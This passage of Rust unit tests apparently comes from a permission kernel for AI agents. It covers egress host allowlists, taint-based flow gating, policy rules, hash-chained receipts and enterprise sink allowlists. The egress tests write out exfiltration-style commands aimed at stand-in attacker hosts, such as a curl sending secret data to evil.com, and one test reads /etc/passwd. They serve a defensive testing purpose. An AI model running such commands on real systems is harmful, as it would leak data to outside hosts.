        // ToolResponse starts with Untrusted/Informational.
        // Declassification raises authority to Suggestive.
        // Write requires Suggestive authority — should now be allowed.
        let (d, _) = kernel.decide_with_parents(Operation::WriteFiles, "/out.txt", &[tool]);
        assert!(
            d.verdict.is_allowed(),
            "Declassified tool response should allow write, got {:?}",
            d.verdict
        );
    }

    // ── Egress policy integration tests ────────────────────────────────

    #[cfg(feature = "spec")]
    mod egress_tests {
        use super::*;
        use crate::command::CommandLattice;
        use crate::egress_policy::EgressPolicy;

        /// Build a kernel that has all capabilities enabled and no command
        /// restrictions — isolating just the egress policy check.
        ///
        /// Pre-grants approvals for all egress-capable operations so the
        /// uninhabitable_state constraint doesn't interfere with egress policy tests.
        fn kernel_with_egress(toml: &str) -> Kernel {
            let policy = EgressPolicy::from_toml(toml).unwrap();
            let mut perms = PermissionLattice::permissive();
            perms.commands = CommandLattice::permissive();
            let mut kernel = Kernel::new(perms);
            kernel.set_egress_policy(policy);
            // Pre-grant approvals so uninhabitable_state gating doesn't mask egress denials
            kernel.grant_approval(Operation::RunBash, 100);
            kernel.grant_approval(Operation::GitPush, 100);
            kernel.grant_approval(Operation::CreatePr, 100);
            kernel.grant_approval(Operation::WebFetch, 100);
            kernel.grant_approval(Operation::WebSearch, 100);
            kernel.grant_approval(Operation::SpawnAgent, 100);
            kernel
        }

        #[test]
        fn bash_curl_to_denied_host_is_blocked() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
            let (d, token) = kernel.decide(
                Operation::RunBash,
                "curl https://evil.com/exfil?data=secret",
            );
            assert!(d.verdict.is_denied(), "expected deny, got {:?}", d.verdict);
            assert!(token.is_none());
            match &d.verdict {
                Verdict::Deny(DenyReason::EgressBlocked {
                    host,
                    policy_reason,
                }) => {
                    assert_eq!(host, "evil.com");
                    assert!(policy_reason.contains("evil.com"));
                    assert!(policy_reason.contains("allowed hosts:"));
                }
                other => panic!("expected EgressBlocked, got {other:?}"),
            }
        }

        #[test]
        fn bash_curl_to_allowed_host_passes() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com", "crates.io"]"#);
            let (d, token) = kernel.decide(Operation::RunBash, "curl https://api.github.com/repos");
            assert!(
                d.verdict.is_allowed(),
                "expected allow, got {:?}",
                d.verdict
            );
            assert!(token.is_some());
        }

        #[test]
        fn bash_safe_command_no_egress_passes() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
            let (d, _) = kernel.decide(Operation::RunBash, "cargo test --lib");
            assert!(
                d.verdict.is_allowed(),
                "safe command should pass, got {:?}",
                d.verdict
            );
        }

        #[test]
        fn web_fetch_denied_host() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
            let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.com/data");
            assert!(d.verdict.is_denied());
            match &d.verdict {
                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
                    assert_eq!(host, "evil.com");
                }
                other => panic!("expected EgressBlocked, got {other:?}"),
            }
        }

        #[test]
        fn web_fetch_allowed_host() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["*.github.com"]"#);
            let (d, token) = kernel.decide(Operation::WebFetch, "https://api.github.com/repos");
            assert!(d.verdict.is_allowed());
            assert!(token.is_some());
        }

        #[test]
        fn git_push_denied_host() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
            let (d, _) = kernel.decide(Operation::GitPush, "https://evil.com/org/repo.git");
            assert!(d.verdict.is_denied());
            match &d.verdict {
                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
                    assert_eq!(host, "evil.com");
                }
                other => panic!("expected EgressBlocked, got {other:?}"),
            }
        }

        #[test]
        fn git_push_allowed_host() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
            let (d, token) = kernel.decide(Operation::GitPush, "https://github.com/org/repo.git");
            assert!(d.verdict.is_allowed());
            assert!(token.is_some());
        }

        #[test]
        fn git_push_ssh_format_denied() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["github.com"]"#);
            let (d, _) = kernel.decide(Operation::GitPush, "git@evil.com:org/repo.git");
            assert!(d.verdict.is_denied());
            match &d.verdict {
                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
                    assert_eq!(host, "evil.com");
                }
                other => panic!("expected EgressBlocked, got {other:?}"),
            }
        }

        #[test]
        fn deny_list_overrides_wildcard_allow() {
            let mut kernel = kernel_with_egress(
                r#"
allowed_hosts = ["*.github.com"]
denied_hosts = ["evil.github.com"]
"#,
            );
            // evil.github.com matches allow wildcard but deny takes priority
            let (d, _) = kernel.decide(Operation::WebFetch, "https://evil.github.com/exfil");
            assert!(d.verdict.is_denied());

            // good.github.com is fine
            let (d2, _) = kernel.decide(Operation::WebFetch, "https://good.github.com/data");
            assert!(d2.verdict.is_allowed());
        }

        #[test]
        fn no_egress_policy_allows_all() {
            let mut perms = PermissionLattice::permissive();
            perms.commands = CommandLattice::permissive();
            let mut kernel = Kernel::new(perms);
            kernel.grant_approval(Operation::WebFetch, 10);
            // No egress policy set — should allow any host
            let (d, _) = kernel.decide(Operation::WebFetch, "https://anything.com/data");
            assert!(d.verdict.is_allowed());
        }

        #[test]
        fn read_files_not_affected_by_egress() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = []"#);
            // Empty allowlist means all egress denied, but reads aren't egress
            let (d, _) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
            assert!(d.verdict.is_allowed());
        }

        #[test]
        fn bash_multiple_destinations_first_blocked() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["b.com"]"#);
            // Two destinations: a.com (blocked) then b.com (allowed)
            let (d, _) =
                kernel.decide(Operation::RunBash, "curl https://a.com; curl https://b.com");
            assert!(
                d.verdict.is_denied(),
                "first blocked host should deny the whole command"
            );
            match &d.verdict {
                Verdict::Deny(DenyReason::EgressBlocked { host, .. }) => {
                    assert_eq!(host, "a.com");
                }
                other => panic!("expected EgressBlocked for a.com, got {other:?}"),
            }
        }

        #[test]
        fn egress_blocked_recorded_in_trace() {
            let mut kernel = kernel_with_egress(r#"allowed_hosts = ["safe.com"]"#);
            let trace_before = kernel.trace().len();
            let _ = kernel.decide(Operation::WebFetch, "https://evil.com/data");
            assert_eq!(kernel.trace().len(), trace_before + 1);
            let entry = kernel.trace().last().unwrap();
            assert!(entry.verdict.is_denied());
        }
    }

    // ── #654: Causal decide — flow graph supersedes flat label in decide() ──

    #[test]
    fn causal_decide_flat_decide_skips_flow_gate_when_graph_enabled() {
        // #654: When the flow graph is enabled, flat decide() should NOT
        // use the session-level flow_label as a gate. The over-tainting
        // problem is solved by the DAG — callers use decide_with_parents()
        // for flow-checked decisions.
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();
        kernel.enable_flow_graph();

        // WebFetch taints the flat session label
        let (d, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(d.verdict.is_allowed());

        // Without #654, this would be DENIED by the flat flow_label gate.
        // With #654, decide() skips the flat gate when the graph is active.
        let (d, _) = kernel.decide(Operation::WriteFiles, "/tmp/clean.txt");
        assert!(
            d.verdict.is_allowed(),
            "With flow graph enabled, flat decide() should NOT gate on session label. Got {:?}",
            d.verdict
        );
    }

    #[test]
    fn causal_decide_flat_label_still_gates_without_graph() {
        // Backward compat: without enable_flow_graph(), the flat label
        // still gates operations (pre-#654 behavior preserved).
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();
        // NOTE: no enable_flow_graph()

        let (d, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(d.verdict.is_allowed());

        let (d, _) = kernel.decide(Operation::WriteFiles, "/tmp/test.txt");
        assert!(
            matches!(d.verdict, Verdict::Deny(DenyReason::FlowViolation { .. })),
            "Without flow graph, flat label should still gate. Got {:?}",
            d.verdict
        );
    }

    #[test]
    fn causal_decide_flat_label_still_updated_for_audit() {
        // #654: Even when the graph is active and decide() skips the gate,
        // the flat flow_label is still updated for audit/reporting.
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();
        kernel.enable_flow_graph();

        // Fetch web content
        let (d, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(d.verdict.is_allowed());

        // The flat label should be tainted (for audit) even though
        // it didn't gate the operation.
        // Verify by disabling the flow graph and checking that the
        // flat label would now gate.
        // We can't disable the graph, but we can verify the label
        // is tainted by checking the exposure transition covers web fetch.
        assert_eq!(
            d.exposure_transition.contributed_label,
            Some(ExposureLabel::UntrustedContent)
        );
    }

    #[test]
    fn causal_decide_key_test_adversarial_read_clean_write_allowed() {
        // Issue #654 acceptance criteria:
        // "adversarial read + independent clean write → clean write ALLOWED"
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        // Adversarial content observed
        let _web = kernel
            .observe(portcullis_core::flow::NodeKind::WebContent, &[])
            .unwrap();

        // Independent clean file read
        let file = kernel
            .observe(portcullis_core::flow::NodeKind::FileRead, &[])
            .unwrap();

        // Clean write depending only on the file — ALLOWED
        let (d, token) = kernel.decide_with_parents(Operation::WriteFiles, "/clean.txt", &[file]);
        assert!(
            d.verdict.is_allowed(),
            "#654 key test: independent clean write must be ALLOWED. Got {:?}",
            d.verdict
        );
        assert!(token.is_some());
    }

    #[test]
    fn causal_decide_key_test_write_depending_on_adversarial_denied() {
        // Issue #654 acceptance criteria:
        // "write that depends on adversarial content → still DENIED"
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        // Adversarial content observed
        let web = kernel
            .observe(portcullis_core::flow::NodeKind::WebContent, &[])
            .unwrap();

        // Write depending on adversarial content — DENIED
        let (d, token) = kernel.decide_with_parents(Operation::WriteFiles, "/tainted.txt", &[web]);
        assert!(
            d.verdict.is_denied(),
            "#654 key test: write depending on adversarial content must be DENIED. Got {:?}",
            d.verdict
        );
        assert!(token.is_none());
        assert!(matches!(
            d.verdict,
            Verdict::Deny(DenyReason::FlowViolation { .. })
        ));
    }

    #[test]
    fn causal_decide_exposure_still_tracked_for_audit() {
        // #654: ExposureTracker is still updated for audit/reporting.
        use crate::capability::CapabilityLattice;
        let mut perms = PermissionLattice::builder()
            .description("everything-allowed")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Always,
                edit_files: CapabilityLevel::Always,
                run_bash: CapabilityLevel::Always,
                glob_search: CapabilityLevel::Always,
                grep_search: CapabilityLevel::Always,
                web_search: CapabilityLevel::Always,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Always,
                git_push: CapabilityLevel::Always,
                create_pr: CapabilityLevel::Always,
                manage_pods: CapabilityLevel::Always,
                spawn_agent: CapabilityLevel::Always,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();
        perms.obligations.approvals.clear();

        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_control();
        kernel.enable_flow_graph();

        // Read private data
        let (d, _) = kernel.decide(Operation::ReadFiles, "/etc/passwd");
        assert!(d.verdict.is_allowed());
        assert!(kernel.exposure().contains(ExposureLabel::PrivateData));

        // Fetch untrusted content
        let (d, _) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(d.verdict.is_allowed());
        assert!(kernel.exposure().contains(ExposureLabel::UntrustedContent));

        // Exposure is tracked for audit even though flow graph is active
        assert_eq!(kernel.exposure().count(), 2);
    }

    // ── PolicyRuleSet integration tests (#657) ──────────────────────────

    #[cfg(feature = "spec")]
    mod policy_rules_integration {
        use super::*;
        use crate::{CapabilityLattice, CommandLattice};
        use portcullis_core::policy_rules::{
            AdmissibilityRule, LabelPredicate, PolicyRuleSet, RuleVerdict,
        };
        use portcullis_core::{IntegLevel, SinkClass};

        /// Helper: build a kernel with the given policy rules and all capabilities.
        fn kernel_with_policy(rules: PolicyRuleSet) -> Kernel {
            // All capabilities set to Always — policy is the only gate.
            let all_caps = CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Always,
                edit_files: CapabilityLevel::Always,
                run_bash: CapabilityLevel::Always,
                glob_search: CapabilityLevel::Always,
                grep_search: CapabilityLevel::Always,
                web_search: CapabilityLevel::Always,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Always,
                git_push: CapabilityLevel::Always,
                create_pr: CapabilityLevel::Always,
                manage_pods: CapabilityLevel::Always,
                spawn_agent: CapabilityLevel::Always,
                #[cfg(not(kani))]
                extensions: std::collections::BTreeMap::new(),
            };
            let mut perms = PermissionLattice::builder()
                .description("policy-test: all caps, policy is the gate")
                .capabilities(all_caps)
                .commands(CommandLattice::permissive())
                .build();
            // Clear obligations so the uninhabitable state doesn't interfere.
            perms.obligations.approvals.clear();
            let mut kernel = Kernel::new(perms);
            kernel.enable_flow_control();
            kernel.set_policy_rules(rules);
            kernel
        }

        #[test]
        fn policy_allows_trusted_write() {
            let mut rules = PolicyRuleSet::new();
            rules.push(AdmissibilityRule {
                name: "trusted workspace writes allowed".to_string(),
                source_predicate: LabelPredicate {
                    min_integrity: Some(IntegLevel::Trusted),
                    ..LabelPredicate::any()
                },
                artifact_predicate: LabelPredicate::any(),
                sink_class: SinkClass::WorkspaceWrite,
                verdict: RuleVerdict::Allow,
            });

            let mut kernel = kernel_with_policy(rules);

            // WriteFiles to a workspace path → classified as WorkspaceWrite
            let (d, token) = kernel.decide(Operation::WriteFiles, "src/main.rs");
            assert!(
                matches!(d.verdict, Verdict::Allow),
                "trusted write should be allowed, got: {:?}",
                d.verdict
            );
            assert!(token.is_some());
        }

        #[test]
        fn policy_denies_by_rule() {
            let mut rules = PolicyRuleSet::new();
            rules.push(AdmissibilityRule {
                name: "no git push ever".to_string(),
                source_predicate: LabelPredicate::any(),
                artifact_predicate: LabelPredicate::any(),
                sink_class: SinkClass::GitPush,
                verdict: RuleVerdict::Deny,
            });

            let mut kernel = kernel_with_policy(rules);

            // GitPush → denied by policy even though capabilities allow it
            let (d, token) = kernel.decide(Operation::GitPush, "origin/main");
            assert!(
                matches!(d.verdict, Verdict::Deny(DenyReason::PolicyDenied { .. })),
                "git push should be denied by policy rule, got: {:?}",
                d.verdict
            );
            assert!(token.is_none());

            // Verify the deny reason contains the rule name
            if let Verdict::Deny(DenyReason::PolicyDenied {
                rule_name,
                sink_class,
            }) = &d.verdict
            {
                assert_eq!(rule_name, "no git push ever");
                assert!(sink_class.contains("GitPush"));
            }
        }

        #[test]
        fn policy_requires_approval() {
            let mut rules = PolicyRuleSet::new();
            rules.push(AdmissibilityRule {
                name: "bash needs approval".to_string(),
                source_predicate: LabelPredicate::any(),
                artifact_predicate: LabelPredicate::any(),
                sink_class: SinkClass::BashExec,
                verdict: RuleVerdict::RequiresApproval,
            });

            let mut kernel = kernel_with_policy(rules);

            // RunBash → requires approval by policy
            let (d, token) = kernel.decide(Operation::RunBash, "ls -la");
            assert!(
                matches!(d.verdict, Verdict::RequiresApproval),
                "bash should require approval, got: {:?}",
                d.verdict
            );
            assert!(token.is_none());

            // Grant approval and try again
            kernel.grant_approval(Operation::RunBash, 1);
            let (d, token) = kernel.decide(Operation::RunBash, "ls -la");
            assert!(
                matches!(d.verdict, Verdict::Allow),
                "bash should be allowed after approval, got: {:?}",
                d.verdict
            );
            assert!(token.is_some());
        }

        #[test]
        fn policy_default_deny_when_no_rule_matches() {
            let mut rules = PolicyRuleSet::new();
            // Only allow WorkspaceWrite — everything else default-denied
            rules.push(AdmissibilityRule {
                name: "allow writes only".to_string(),
                source_predicate: LabelPredicate::any(),
                artifact_predicate: LabelPredicate::any(),
                sink_class: SinkClass::WorkspaceWrite,
                verdict: RuleVerdict::Allow,
            });

            let mut kernel = kernel_with_policy(rules);

            // Write is allowed
            let (d, _) = kernel.decide(Operation::WriteFiles, "src/lib.rs");
            assert!(matches!(d.verdict, Verdict::Allow));

            // GitPush has no matching rule → default deny
            let (d, token) = kernel.decide(Operation::GitPush, "origin/main");
            assert!(
                matches!(d.verdict, Verdict::Deny(DenyReason::PolicyDenied { .. })),
                "unmatched operation should be default-denied, got: {:?}",
                d.verdict
            );
            assert!(token.is_none());

            // Verify it's a default deny (empty rule name)
            if let Verdict::Deny(DenyReason::PolicyDenied { rule_name, .. }) = &d.verdict {
                assert_eq!(rule_name, "(default deny)");
            }
        }

        #[test]
        fn no_policy_rules_means_no_filtering() {
            // Kernel without policy rules — all operations pass through
            let perms = PermissionLattice::safe_pr_fixer();
            let mut kernel = Kernel::new(perms);
            // Don't call set_policy_rules

            let (d, token) = kernel.decide(Operation::WriteFiles, "src/main.rs");
            assert!(matches!(d.verdict, Verdict::Allow));
            assert!(token.is_some());
        }
    }

    // ═══════════════════════════════════════════════════════════════════
    // Receipt chain integration tests
    // ═══════════════════════════════════════════════════════════════════

    mod receipt_chain_tests {
        use super::*;
        use crate::PermissionLattice;

        #[test]
        fn decide_produces_receipt_when_enabled() {
            let perms = PermissionLattice::safe_pr_fixer();
            let mut kernel = Kernel::new(perms);
            kernel.enable_receipt_chain();

            let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
            assert!(d.verdict.is_allowed());

            let chain = kernel.receipt_chain().expect("chain should be enabled");
            assert_eq!(chain.len(), 1);
            assert!(chain.verify().is_ok());

            let receipt = &chain.receipts()[0];
            assert_eq!(receipt.operation, "ReadFiles");
            assert_eq!(receipt.subject, "/workspace/main.rs");
        }

        #[test]
        fn deny_produces_receipt() {
            let perms = PermissionLattice::safe_pr_fixer();
            let mut kernel = Kernel::new(perms);
            kernel.enable_receipt_chain();

            // safe_pr_fixer has git_push=Never
            let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
            assert!(d.verdict.is_denied());

            let chain = kernel.receipt_chain().unwrap();
            assert_eq!(chain.len(), 1);
            assert!(chain.verify().is_ok());

            let receipt = &chain.receipts()[0];
            assert!(matches!(
                receipt.verdict,
                portcullis_core::flow::FlowVerdict::Deny(_)
            ));
        }

        #[test]
        fn chain_valid_after_multiple_decisions() {
            let perms = PermissionLattice::safe_pr_fixer();
            let mut kernel = Kernel::new(perms);
            kernel.enable_receipt_chain();

            // Mix of allows and denies
            kernel.decide(Operation::ReadFiles, "/workspace/a.rs");
            kernel.decide(Operation::WriteFiles, "/workspace/b.rs");
            kernel.decide(Operation::GitPush, "origin/main"); // denied
            kernel.decide(Operation::GlobSearch, "/workspace/**");
            kernel.decide(Operation::ReadFiles, "/workspace/c.rs");

            let chain = kernel.receipt_chain().unwrap();
            assert_eq!(chain.len(), 5);
            assert!(
                chain.verify().is_ok(),
                "chain should verify after 5 decisions"
            );

            // Head hash should not be zeros
            assert_ne!(chain.head_hash(), &[0u8; 32]);
        }

        #[test]
        fn receipt_chain_disabled_by_default() {
            let perms = PermissionLattice::safe_pr_fixer();
            let mut kernel = Kernel::new(perms);

            kernel.decide(Operation::ReadFiles, "/workspace/main.rs");

            assert!(
                kernel.receipt_chain().is_none(),
                "chain should be None when not enabled"
            );
        }

        #[test]
        fn receipt_links_are_contiguous() {
            let perms = PermissionLattice::safe_pr_fixer();
            let mut kernel = Kernel::new(perms);
            kernel.enable_receipt_chain();

            kernel.decide(Operation::ReadFiles, "/a");
            kernel.decide(Operation::ReadFiles, "/b");
            kernel.decide(Operation::ReadFiles, "/c");

            let chain = kernel.receipt_chain().unwrap();
            let receipts = chain.receipts();

            // First receipt links to genesis (all zeros)
            assert_eq!(receipts[0].prev_hash, [0u8; 32]);

            // Each subsequent receipt's prev_hash == predecessor's receipt_hash
            for i in 1..receipts.len() {
                assert_eq!(
                    receipts[i].prev_hash,
                    receipts[i - 1].receipt_hash,
                    "receipt {} should link to receipt {}",
                    i,
                    i - 1
                );
            }
        }
    }

    // ── Enterprise allowlist enforcement ─────────────────────────────

    #[test]
    fn enterprise_blocks_denied_sink() {
        use portcullis_core::enterprise::EnterpriseAllowlist;
        use portcullis_core::SinkClass;

        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);

        let enterprise = EnterpriseAllowlist {
            denied_sinks: vec![SinkClass::HTTPEgress],
            ..Default::default()
        };
        kernel.set_enterprise(enterprise);

        // WebFetch maps to HTTPEgress — should be denied.
        let (d, token) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(
            token.is_none(),
            "enterprise-blocked operation should not get a token"
        );
        assert!(
            matches!(
                d.verdict,
                Verdict::Deny(DenyReason::EnterpriseBlocked { .. })
            ),
            "expected EnterpriseBlocked, got {:?}",
            d.verdict,
        );
    }

    #[test]
    fn enterprise_allows_permitted_sink() {
        use portcullis_core::enterprise::EnterpriseAllowlist;
        use portcullis_core::SinkClass;

        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);

        // Deny only EmailSend — workspace writes should still be allowed.
        let enterprise = EnterpriseAllowlist {
            denied_sinks: vec![SinkClass::EmailSend],
            ..Default::default()
        };
        kernel.set_enterprise(enterprise);

        let (d, token) = kernel.decide(Operation::WriteFiles, "/workspace/test.rs");
        assert!(token.is_some(), "permitted sink should get a token");
        assert!(
            matches!(d.verdict, Verdict::Allow),
            "expected Allow, got {:?}",
            d.verdict,
        );
    }

    #[test]
    fn no_enterprise_no_check() {
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        // No enterprise set — all sinks should pass.

        let (d, token) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(
            token.is_some(),
            "without enterprise, web fetch should be allowed"
        );
        assert!(
            matches!(d.verdict, Verdict::Allow),
            "expected Allow, got {:?}",
            d.verdict,
        );
    }

    #[test]
    fn enterprise_allowlist_only_permits_listed_sinks() {
        use portcullis_core::enterprise::EnterpriseAllowlist;
        use portcullis_core::SinkClass;

        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);

        // Explicit allowlist: only WorkspaceWrite is permitted.
        let enterprise = EnterpriseAllowlist {
            allowed_sinks: Some(vec![SinkClass::WorkspaceWrite]),
            ..Default::default()
        };
        kernel.set_enterprise(enterprise);

        // WorkspaceWrite should be allowed.
        let (d, _) = kernel.decide(Operation::WriteFiles, "/workspace/test.rs");
        assert!(
            matches!(d.verdict, Verdict::Allow),
            "WorkspaceWrite should be allowed, got {:?}",
            d.verdict,
        );

        // HTTPEgress (via WebFetch) should be denied — not in allowlist.
        let (d2, token2) = kernel.decide(Operation::WebFetch, "https://example.com");
        assert!(
            token2.is_none(),
            "enterprise-blocked operation should not get a token"
        );
        assert!(
            matches!(
                d2.verdict,
                Verdict::Deny(DenyReason::EnterpriseBlocked { .. })
            ),
            "HTTPEgress should be enterprise-blocked, got {:?}",
            d2.verdict,
        );
    }
}
